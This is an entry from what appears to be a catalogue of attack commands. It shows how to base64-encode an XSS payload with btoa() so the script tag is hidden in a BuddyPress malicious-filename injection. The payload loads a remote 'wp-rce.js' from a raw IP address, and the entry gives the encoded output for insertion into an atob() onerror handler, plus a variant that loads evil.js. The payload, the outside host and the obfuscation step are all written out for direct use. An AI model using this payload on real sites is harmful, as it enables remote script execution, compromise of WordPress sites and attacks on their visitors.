---
id: cmd-001
data: >-
  btoa('Running POC<script type="text/javascript"
  src="http://159.203.190.123/w9rfas89eufs9e8fu98ewufjwefiojwe_s1058g-/wp-rce.js"></script>');
tags:
  - encoding
  - xss
  - payload
type: command
output: >-
  UnVubmluZyBQT0M8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwOi8vMTU5LjIwMy4xOTAuMTIzL3c5cmZhczg5ZXVmczllOGZ1OThld3VmandlZmlvandlX3MxMDU4Zy0vd3AtcmNlLmpzIj48L3NjcmlwdD4=
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:32.418Z'
verified: false
validated: true
submitted: true
---
# btoa Payload Encode

## Command

```javascript
btoa('Running POC<script type="text/javascript" src="http://159.203.190.123/w9rfas89eufs9e8fu98ewufjwefiojwe_s1058g-/wp-rce.js"></script>');
```

## Description

This JavaScript command uses the built-in btoa() function in the browser console to base64-encode a string payload for embedding in an XSS attack, specifically for the BuddyPress filename injection to obfuscate the script tag.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| input string | The plaintext to encode, including HTML/script tags | Yes |

## Examples

### Basic Usage

```javascript
btoa('Running POC<script type="text/javascript" src="http://159.203.190.123/w9rfas89eufs9e8fu98ewufjwefiojwe_s1058g-/wp-rce.js"></script>');
```

### Advanced Usage

For custom payloads:

```javascript
btoa('Custom alert(1)<script src="evil.js"></script>');
```

## Expected Output

Base64-encoded string: UnVubmluZyBQT0M8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwOi8vMTU5LjIwMy4xOTAuMTIzL3c5cmZhczg5ZXVmczllOGZ1OThld3VmandlZmlvandlX3MxMDU4Zy0vd3AtcmNlLmpzIj48L3NjcmlwdD4=. This is inserted into the atob() call in the XSS onerror handler.

## Related

- [[Related Procedure: Upload-Malicious-Filename-for-XSS]]
